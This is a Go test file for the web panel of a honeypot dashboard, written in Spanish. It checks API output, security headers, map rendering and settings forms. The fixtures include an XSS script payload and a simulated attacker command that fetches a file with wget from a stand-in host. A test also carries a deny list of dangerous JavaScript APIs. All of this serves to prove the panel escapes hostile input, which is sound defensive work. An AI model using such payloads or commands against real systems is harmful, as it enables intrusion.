package web

import (
	"context"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"path/filepath"
	"reflect"
	"strings"
	"testing"
	"time"

	"github.com/k0braintheworld/k0pot/internal/auth"
	"github.com/k0braintheworld/k0pot/internal/config"
	"github.com/k0braintheworld/k0pot/internal/episodio"
	"github.com/k0braintheworld/k0pot/internal/model"
	"github.com/k0braintheworld/k0pot/internal/report"
	"github.com/k0braintheworld/k0pot/internal/store"
)

// cargaMaliciosa es lo que un atacante puede teclear como usuario en el
// honeypot. Tiene que llegar al panel como texto, jamas como HTML.
const cargaMaliciosa = `<script>alert('xss')</script>`

func servidorDePrueba(t *testing.T) *Servidor {
	t.Helper()
	s, err := store.Abrir(filepath.Join(t.TempDir(), "test.db"))
	if err != nil {
		t.Fatalf("abriendo almacen: %v", err)
	}
	t.Cleanup(func() { s.Cerrar() })

	eventos := []*model.Evento{
		{
			IDExterno: "a", Timestamp: time.Now().UTC(), Honeypot: "cowrie",
			Protocolo: "ssh", IP: "185.220.101.1", Tipo: model.LoginFallido,
			Detalle:       map[string]string{"usuario": cargaMaliciosa, "password": "123456"},
			Clasificacion: model.RuidoFondo, Motivo: "escaneo automatizado",
		},
		{
			IDExterno: "b", Timestamp: time.Now().UTC(), Honeypot: "cowrie",
			Protocolo: "ssh", IP: "185.220.101.1", Tipo: model.ComandoEjecutado,
			Detalle:       map[string]string{"comando": `wget http://malo/x; ` + cargaMaliciosa},
			Clasificacion: model.Notable, Motivo: "ejecuto comandos " + cargaMaliciosa,
		},
	}
	for _, e := range eventos {
		if _, err := s.Guardar(e); err != nil {
			t.Fatalf("guardando: %v", err)
		}
	}
	// El semaforo cuenta ataques, no eventos: hay que derivar los episodios
	// igual que el mantenimiento en produccion, o no habria gravedad que leer.
	evs := make([]model.Evento, len(eventos))
	for i, e := range eventos {
		evs[i] = *e
	}
	if err := s.GuardarEpisodios(episodio.Agrupar(evs, episodio.HuecoPorDefecto)); err != nil {
		t.Fatalf("guardando episodios: %v", err)
	}
	if err := s.GuardarOrigen(model.Origen{
		IP: "185.220.101.1", Pais: "DE", ISP: "Ejemplo", Reputacion: 100,
		TotalReportes: 500, Tor: true, Enriquecido: true, ConsultadoEn: time.Now().UTC(),
	}); err != nil {
		t.Fatalf("guardando origen: %v", err)
	}

	g, err := config.Abrir(s)
	if err != nil {
		t.Fatalf("abriendo configuracion: %v", err)
	}
	return &Servidor{Almacen: s, Generador: report.PorReglas{}, Config: g}
}

func pedir(t *testing.T, s *Servidor, ruta string) *httptest.ResponseRecorder {
	t.Helper()
	w := httptest.NewRecorder()
	s.Rutas().ServeHTTP(w, httptest.NewRequest(http.MethodGet, ruta, nil))
	return w
}

func TestEstado(t *testing.T) {
	s := conCuenta(t)
	w := conSesion(t, s, http.MethodGet, "/api/estado?dias=7", "", entrarComo(t, s, "prueba", contrasenaPrueba))
	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}

	var e Estado
	if err := json.Unmarshal(w.Body.Bytes(), &e); err != nil {
		t.Fatalf("json invalido: %v", err)
	}
	if e.Total != 2 || e.IPsUnicas != 1 {
		t.Errorf("total=%d ips=%d", e.Total, e.IPsUnicas)
	}
	if e.Nivel != report.Rojo {
		t.Errorf("nivel = %q, esperaba ROJO (hay un evento notable)", e.Nivel)
	}
	if len(e.PorServicio) != 1 || e.PorServicio[0].Valor != "ssh" || e.PorServicio[0].N != 1 {
		t.Errorf("por servicio = %+v, esperaba 1 ataque de ssh", e.PorServicio)
	}
	if len(e.TopIPs) != 1 || !e.TopIPs[0].Tor {
		t.Errorf("top ips = %+v, esperaba el contexto enriquecido", e.TopIPs)
	}
}

func TestDestacadosDevuelveListaVaciaNoNull(t *testing.T) {
	s, err := store.Abrir(filepath.Join(t.TempDir(), "vacio.db"))
	if err != nil {
		t.Fatal(err)
	}
	defer s.Cerrar()

	g, _ := config.Abrir(s)
	srv := &Servidor{Almacen: s, Generador: report.PorReglas{}, Config: g}
	hash, _ := auth.Hash(contrasenaPrueba)
	s.CrearUsuario("prueba", hash)
	w := conSesion(t, srv, http.MethodGet, "/api/destacados", "",
		entrarComo(t, srv, "prueba", contrasenaPrueba))
	// null rompe el .length del navegador; [] no.
	if strings.TrimSpace(w.Body.String()) != "[]" {
		t.Errorf("cuerpo = %q, esperaba []", w.Body.String())
	}
}

func TestInforme(t *testing.T) {
	s := conCuenta(t)
	w := conSesion(t, s, http.MethodGet, "/api/informe?dias=7", "", entrarComo(t, s, "prueba", contrasenaPrueba))
	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}
	var inf Informe
	if err := json.Unmarshal(w.Body.Bytes(), &inf); err != nil {
		t.Fatalf("json invalido: %v", err)
	}
	if !strings.Contains(inf.Texto, "ROJO") || !strings.HasPrefix(inf.Generador, "reglas") {
		t.Errorf("informe = %+v", inf)
	}
}

// La API solo emite JSON. El texto del atacante viaja escapado como cadena
// JSON, de modo que nunca puede cerrar una etiqueta ni abrir un script.
func TestLaAPINoEmiteHTML(t *testing.T) {
	s := conCuenta(t)
	cookie := entrarComo(t, s, "prueba", contrasenaPrueba)
	for _, ruta := range []string{"/api/estado?dias=7", "/api/destacados?dias=7", "/api/informe?dias=7"} {
		w := conSesion(t, s, http.MethodGet, ruta, "", cookie)

		if ct := w.Header().Get("Content-Type"); !strings.HasPrefix(ct, "application/json") {
			t.Errorf("%s: Content-Type = %q, esperaba JSON", ruta, ct)
		}
		cuerpo := w.Body.String()
		// El codificador JSON de Go escapa < > & a \u003c \u003e \u0026
		// precisamente para que un cuerpo JSON no pueda cerrar una etiqueta
		// si alguien lo incrusta en HTML.
		if strings.Contains(cuerpo, "<script>") || strings.Contains(cuerpo, "</script>") {
			t.Errorf("%s: hay una etiqueta script literal en el cuerpo:\n%s", ruta, cuerpo)
		}
		if !strings.Contains(cuerpo, `\u003cscript\u003e`) {
			t.Errorf("%s: esperaba la carga presente pero escapada:\n%s", ruta, cuerpo)
		}
	}
}

// Aunque algo se colara en el HTML, la CSP impide que el navegador lo
// ejecute. Es la segunda linea de defensa y no debe desaparecer.
func TestCabecerasDeSeguridad(t *testing.T) {
	w := pedir(t, servidorDePrueba(t), "/entrar.html")

	csp := w.Header().Get("Content-Security-Policy")
	for _, directiva := range []string{"default-src 'self'", "script-src 'self'", "frame-ancestors 'none'"} {
		if !strings.Contains(csp, directiva) {
			t.Errorf("CSP = %q, falta %q", csp, directiva)
		}
	}
	if strings.Contains(csp, "unsafe-inline") {
		t.Errorf("la CSP permite scripts en linea: %q", csp)
	}
	if w.Header().Get("X-Content-Type-Options") != "nosniff" {
		t.Error("falta X-Content-Type-Options: nosniff")
	}
}

func TestSirveElPanelEmbebido(t *testing.T) {
	s := conCuenta(t)
	cookie := entrarComo(t, s, "prueba", contrasenaPrueba)
	for _, ruta := range []string{"/", "/app.js", "/estilo.css", "/mundo.json"} {
		if w := conSesion(t, s, http.MethodGet, ruta, "", cookie); w.Code != http.StatusOK {
			t.Errorf("%s: codigo = %d", ruta, w.Code)
		}
	}
}

// El HTML embebido no debe traer logica: si alguien mete innerHTML en el
// frontend, este test lo canta.
func TestElFrontendNoUsaInnerHTML(t *testing.T) {
	js, err := estaticos.ReadFile("static/app.js")
	if err != nil {
		t.Fatal(err)
	}

	// Se miran solo las lineas de codigo: el comentario que documenta esta
	// misma prohibicion nombra las APIs y disparaba el test.
	var codigo strings.Builder
	for _, linea := range strings.Split(string(js), "\n") {
		if recortada := strings.TrimSpace(linea); strings.HasPrefix(recortada, "//") {
			continue
		}
		codigo.WriteString(linea)
		codigo.WriteString("\n")
	}

	for _, prohibido := range []string{"innerHTML", "insertAdjacentHTML", "document.write", "eval("} {
		if strings.Contains(codigo.String(), prohibido) {
			t.Errorf("app.js usa %q: los datos del atacante podrian ejecutarse", prohibido)
		}
	}
}

func TestRangoDeDiasAcotado(t *testing.T) {
	casos := map[string]int{"": 1, "0": 1, "-5": 1, "abc": 1, "7": 7, "99999": 365}
	for entrada, esperado := range casos {
		r := httptest.NewRequest(http.MethodGet, "/api/estado?dias="+entrada, nil)
		if got := dias(r); got != esperado {
			t.Errorf("dias(%q) = %d, esperaba %d", entrada, got, esperado)
		}
	}
}

func TestInformeRespetaLaCancelacion(t *testing.T) {
	s := conCuenta(t)
	ctx, cancelar := context.WithCancel(context.Background())
	cancelar()

	w := httptest.NewRecorder()
	r := httptest.NewRequest(http.MethodGet, "/api/informe", nil).WithContext(ctx)
	r.AddCookie(entrarComo(t, s, "prueba", contrasenaPrueba))
	s.Rutas().ServeHTTP(w, r)
	// PorReglas no consulta nada externo, asi que responde igual; lo que se
	// comprueba es que el contexto se propaga sin provocar un panico.
	if w.Code != http.StatusOK {
		t.Errorf("codigo = %d", w.Code)
	}
}

func TestSerie(t *testing.T) {
	s := conCuenta(t)
	w := conSesion(t, s, http.MethodGet, "/api/serie?dias=1", "", entrarComo(t, s, "prueba", contrasenaPrueba))
	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}
	var r struct {
		Granularidad string             `json:"granularidad"`
		Puntos       []store.PuntoSerie `json:"puntos"`
	}
	if err := json.Unmarshal(w.Body.Bytes(), &r); err != nil {
		t.Fatalf("json invalido: %v", err)
	}
	if r.Granularidad != string(store.PorHora) {
		t.Errorf("granularidad = %q, con 1 dia esperaba por horas", r.Granularidad)
	}
	if len(r.Puntos) == 0 {
		t.Fatal("serie vacia")
	}
	var total, notables int
	for _, p := range r.Puntos {
		total += p.Total
		notables += p.Notable
	}
	if total != 2 || notables != 1 {
		t.Errorf("total=%d notables=%d, esperaba 2 y 1", total, notables)
	}
}

// Con rangos largos el agrupado pasa a dias: por horas serian cientos de
// barras ilegibles.
func TestSerieCambiaDeGranularidad(t *testing.T) {
	s := conCuenta(t)
	cookie := entrarComo(t, s, "prueba", contrasenaPrueba)
	for ruta, esperado := range map[string]string{
		"/api/serie?dias=1":  string(store.PorHora),
		"/api/serie?dias=2":  string(store.PorHora),
		"/api/serie?dias=7":  string(store.PorDia),
		"/api/serie?dias=90": string(store.PorDia),
	} {
		var r struct {
			Granularidad string `json:"granularidad"`
		}
		json.Unmarshal(conSesion(t, s, http.MethodGet, ruta, "", cookie).Body.Bytes(), &r)
		if r.Granularidad != esperado {
			t.Errorf("%s: granularidad = %q, esperaba %q", ruta, r.Granularidad, esperado)
		}
	}
}

func TestRecientes(t *testing.T) {
	s := conCuenta(t)
	w := conSesion(t, s, http.MethodGet, "/api/recientes", "", entrarComo(t, s, "prueba", contrasenaPrueba))
	if w.Code != http.StatusOK {
		t.Fatalf("codigo = %d", w.Code)
	}
	var lista []store.Reciente
	if err := json.Unmarshal(w.Body.Bytes(), &lista); err != nil {
		t.Fatalf("json invalido: %v", err)
	}
	if len(lista) != 2 {
		t.Fatalf("recibidos %d eventos, esperaba 2", len(lista))
	}
	// El mas reciente primero: es un feed en vivo.
	if lista[0].Tipo != model.ComandoEjecutado {
		t.Errorf("el primero es %q, esperaba el evento mas nuevo", lista[0].Tipo)
	}
}

// La CSP lleva style-src 'self', que bloquea los atributos style en linea.
// setAttribute("style", ...) deja el atributo en el DOM pero el navegador no
// lo aplica: fallo mudo y dificil de ver. Las medidas se asignan por CSSOM
// (elemento.style.propiedad), que la CSP no bloquea.
func TestElFrontendNoUsaAtributoStyle(t *testing.T) {
	js, err := estaticos.ReadFile("static/app.js")
	if err != nil {
		t.Fatal(err)
	}
	var codigo strings.Builder
	for _, linea := range strings.Split(string(js), "\n") {
		if strings.HasPrefix(strings.TrimSpace(linea), "//") {
			continue
		}
		codigo.WriteString(linea)
		codigo.WriteString("\n")
	}
	for _, prohibido := range []string{`setAttribute("style"`, `setAttribute('style'`} {
		if strings.Contains(codigo.String(), prohibido) {
			t.Errorf("app.js usa %s: la CSP lo bloquea y el estilo no se aplica", prohibido)
		}
	}
}

// El mapa tiene que venir embebido: si falta, el panel pierde su pieza
// principal en cuanto se despliega el binario en otra maquina.
func TestElMapaVaEmbebido(t *testing.T) {
	datos, err := estaticos.ReadFile("static/mundo.json")
	if err != nil {
		t.Fatalf("mundo.json no esta embebido: %v", err)
	}
	var m struct {
		Ancho, Alto float64
		Paises      map[string]struct {
			N string     `json:"n"`
			D string     `json:"d"`
			C [2]float64 `json:"c"`
		} `json:"paises"`
	}
	if err := json.Unmarshal(datos, &m); err != nil {
		t.Fatalf("mundo.json invalido: %v", err)
	}
	if len(m.Paises) < 150 {
		t.Errorf("solo %d paises en el mapa", len(m.Paises))
	}
	for _, iso := range []string{"ES", "CN", "RU", "US", "DE", "BR"} {
		p, ok := m.Paises[iso]
		if !ok {
			t.Errorf("falta %s en el mapa", iso)
			continue
		}
		if p.D == "" || p.N == "" {
			t.Errorf("%s sin contorno o sin nombre", iso)
		}
		if p.C[0] < 0 || p.C[0] > m.Ancho || p.C[1] < 0 || p.C[1] > m.Alto {
			t.Errorf("%s: centro %v fuera del lienzo", iso, p.C)
		}
	}
}

// El panel necesita saber a donde apuntan las lineas de ataque.
func TestEstadoPublicaElPaisPropio(t *testing.T) {
	s := conCuenta(t)
	cookie := entrarComo(t, s, "prueba", contrasenaPrueba)

	c := s.Config.Actual()
	c.PaisPropio = "PT"
	if err := s.Config.Guardar(c); err != nil {
		t.Fatal(err)
	}

	var e Estado
	json.Unmarshal(conSesion(t, s, http.MethodGet, "/api/estado", "", cookie).Body.Bytes(), &e)
	if e.PaisPropio != "PT" {
		t.Errorf("pais propio = %q, esperaba PT", e.PaisPropio)
	}
}

// El pais propio tiene que existir en el mapa embebido, o no habria destino
// que dibujar.
func TestElPaisPorDefectoExisteEnElMapa(t *testing.T) {
	datos, err := estaticos.ReadFile("static/mundo.json")
	if err != nil {
		t.Fatal(err)
	}
	var m struct {
		Paises map[string]json.RawMessage `json:"paises"`
	}
	if err := json.Unmarshal(datos, &m); err != nil {
		t.Fatal(err)
	}
	if _, ok := m.Paises[config.PorDefecto().PaisPropio]; !ok {
		t.Errorf("el pais por defecto %q no esta en el mapa",
			config.PorDefecto().PaisPropio)
	}
}

// Una clase que apaga los eventos de raton no puede aparecer en el HTML
// estatico: las del mapa (.ataques, .marca-propia) las pone el JavaScript
// sobre nodos SVG, asi que verlas en index.html significa que una clase
// nueva ha chocado con una del mapa.
//
// Paso de verdad: la lista de ataques se llamo .ataques, heredo el
// "pointer-events: none" de las lineas del mapa y quedo entera sin poder
// pulsarse, ademas de heredar su animacion y verse gris parpadeante. Ni el
// navegador ni el compilador avisan de una colision de nombres de clase.
func TestElHTMLNoUsaClasesQueApaganElRaton(t *testing.T) {
	css, err := estaticos.ReadFile("static/estilo.css")
	if err != nil {
		t.Fatal(err)
	}
	html, err := estaticos.ReadFile("static/index.html")
	if err != nil {
		t.Fatal(err)
	}

	// Los comentarios se quitan antes de analizar: uno que MENCIONE
	// pointer-events -como el que explica este mismo fallo- se colaria
	// como si fuera una regla y daria un falso positivo.
	sinComentarios := quitarComentariosCSS(string(css))

	// Clases cuya regla contiene pointer-events: none.
	var sordas []string
	for _, bloque := range strings.Split(sinComentarios, "}") {
		if !strings.Contains(bloque, "pointer-events: none") {
			continue
		}
		selector := bloque
		if i := strings.Index(bloque, "{"); i >= 0 {
			selector = bloque[:i]
		}
		for _, campo := range strings.Fields(strings.ReplaceAll(selector, ",", " ")) {
			if strings.HasPrefix(campo, ".") {
				sordas = append(sordas, strings.TrimPrefix(campo, "."))
			}
		}
	}
	if len(sordas) == 0 {
		t.Skip("ninguna clase apaga el raton; nada que comprobar")
	}

	// Se comparan las clases DE VERDAD, no subcadenas del HTML: buscar
	// " ataques\"" tambien casa con aria-label="Buscar ataques", y el test
	// acusaba de una colision que no existia.
	usadas := map[string]bool{}
	for _, trozo := range strings.Split(string(html), `class="`)[1:] {
		fin := strings.Index(trozo, `"`)
		if fin < 0 {
			continue
		}
		for _, c := range strings.Fields(trozo[:fin]) {
			usadas[c] = true
		}
	}
	for _, clase := range sordas {
		if usadas[clase] {
			t.Errorf("index.html usa la clase %q, que lleva pointer-events: none; "+
				"si es una clase nueva, ha chocado con una del mapa", clase)
		}
	}
}

// quitarComentariosCSS elimina los bloques /* ... */.
func quitarComentariosCSS(css string) string {
	var out strings.Builder
	for {
		i := strings.Index(css, "/*")
		if i < 0 {
			out.WriteString(css)
			return out.String()
		}
		out.WriteString(css[:i])
		j := strings.Index(css[i:], "*/")
		if j < 0 {
			return out.String()
		}
		css = css[i+j+2:]
	}
}

// Todo bloque del panel tiene que declarar su ancho en la rejilla.
//
// Sin ancho, CSS lo coloca donde le cabe: el bloque aparece, parece
// correcto, y descoloca la fila entera. Paso con los ataques, que
// declaraban su ancho 400 lineas mas abajo en la hoja y rompian el
// reparto sin que nada lo relacionara con ellos.
func TestCadaBloqueDeclaraSuAnchoEnLaRejilla(t *testing.T) {
	html, err := estaticos.ReadFile("static/index.html")
	if err != nil {
		t.Fatal(err)
	}
	css, err := estaticos.ReadFile("static/estilo.css")
	if err != nil {
		t.Fatal(err)
	}
	hoja := string(css)

	vistos := map[string]bool{}
	for _, trozo := range strings.Split(string(html), `class="bloque bloque-`)[1:] {
		fin := strings.IndexAny(trozo, `" `)
		if fin < 0 {
			continue
		}
		clase := "bloque-" + trozo[:fin]
		if vistos[clase] {
			continue
		}
		vistos[clase] = true

		// Basta con que la clase aparezca en alguna regla con grid-column.
		declarado := false
		for _, bloque := range strings.Split(hoja, "}") {
			if strings.Contains(bloque, "."+clase) && strings.Contains(bloque, "grid-column") {
				declarado = true
				break
			}
		}
		if !declarado {
			t.Errorf("el bloque %q no declara grid-column: CSS lo colocara donde le quepa", clase)
		}
	}
	if len(vistos) == 0 {
		t.Error("no se encontro ningun bloque; el test no esta comprobando nada")
	}
}

// Todo ajuste editable tiene que poder guardarse desde el panel.
//
// entradaAjustes lleva la lista de campos a mano, asi que anadir uno a
// config.Config y olvidarlo aqui produce el peor fallo posible: el panel
// responde 200, el usuario ve su cambio en pantalla, y al recargar sigue
// como estaba. Paso dos veces -con el intervalo de informes y con los
// avisos- y en ninguna hubo el menor sintoma.
func TestTodoAjusteEditableSePuedeGuardar(t *testing.T) {
	// Las claves se tratan aparte, con su campo de borrado explicito.
	aparte := map[string]bool{
		"clave_abuseipdb": true, "clave_anthropic": true,
		"clave_compatible": true, "clave_aviso": true,
	}

	tags := func(v any) map[string]bool {
		out := map[string]bool{}
		tipo := reflect.TypeOf(v)
		for i := 0; i < tipo.NumField(); i++ {
			tag := tipo.Field(i).Tag.Get("json")
			if tag == "" || tag == "-" {
				continue
			}
			out[strings.Split(tag, ",")[0]] = true
		}
		return out
	}

	editables := tags(config.Config{})
	admitidos := tags(entradaAjustes{})

	for campo := range editables {
		if aparte[campo] || admitidos[campo] {
			continue
		}
		t.Errorf("config.Config tiene %q pero entradaAjustes no lo acepta: "+
			"guardarlo desde el panel respondera 200 y no cambiara nada", campo)
	}
}

// Cada pestana de ajustes tiene que tener contenido, y cada contenido su
// pestana.
//
// El boton de "Avisos" se anadio con un reemplazo que fallo en silencio: el
// grupo quedo en el HTML y la pestana no, asi que habia una seccion entera
// de ajustes a la que no se podia llegar por ningun sitio. Nada avisa de
// eso: el HTML es valido y el panel carga con normalidad.
func TestCadaPestanaDeAjustesTieneSuContenido(t *testing.T) {
	html, err := estaticos.ReadFile("static/index.html")
	if err != nil {
		t.Fatal(err)
	}
	h := string(html)

	extraer := func(atributo string) map[string]bool {
		out := map[string]bool{}
		for _, trozo := range strings.Split(h, atributo+`="`)[1:] {
			if fin := strings.Index(trozo, `"`); fin > 0 {
				out[trozo[:fin]] = true
			}
		}
		return out
	}
	pestanas := extraer("data-ir")
	grupos := extraer("data-pestana")

	if len(pestanas) == 0 || len(grupos) == 0 {
		t.Fatal("no se encontraron pestanas; el test no comprueba nada")
	}
	for p := range pestanas {
		if !grupos[p] {
			t.Errorf("la pestana %q no tiene ningun grupo: al pulsarla no se vera nada", p)
		}
	}
	for g := range grupos {
		if !pestanas[g] {
			t.Errorf("el grupo %q no tiene pestana: no hay forma de llegar a el", g)
		}
	}
}

// La marca del honeypot se situa con la misma proyeccion con la que se
// dibuja el mapa. Si las dos formulas divergieran, la marca apareceria
// desplazada respecto a los paises y nadie sabria por que.
func TestLaProyeccionDelMapaEsLaMismaEnLosDosSitios(t *testing.T) {
	js, err := estaticos.ReadFile("static/app.js")
	if err != nil {
		t.Fatal(err)
	}
	codigo := string(js)

	// Equirectangular, tal y como la genera tools/genmapa.py:
	//   x = (lon + 180) / 360 * ancho
	//   y = (90 - lat) / 180 * alto
	for _, formula := range []string{
		"((lon + 180) / 360) * m.ancho",
		"((90 - lat) / 180) * m.alto",
	} {
		if !strings.Contains(codigo, formula) {
			t.Errorf("app.js no proyecta con %q; si cambia la proyeccion del "+
				"mapa hay que cambiarla aqui tambien", formula)
		}
	}
	// Y la inversa, para poder elegir el sitio pinchando.
	for _, formula := range []string{
		"90 - (y / m.alto) * 180",
		"(x / m.ancho) * 360 - 180",
	} {
		if !strings.Contains(codigo, formula) {
			t.Errorf("falta la conversion inversa %q", formula)
		}
	}
}
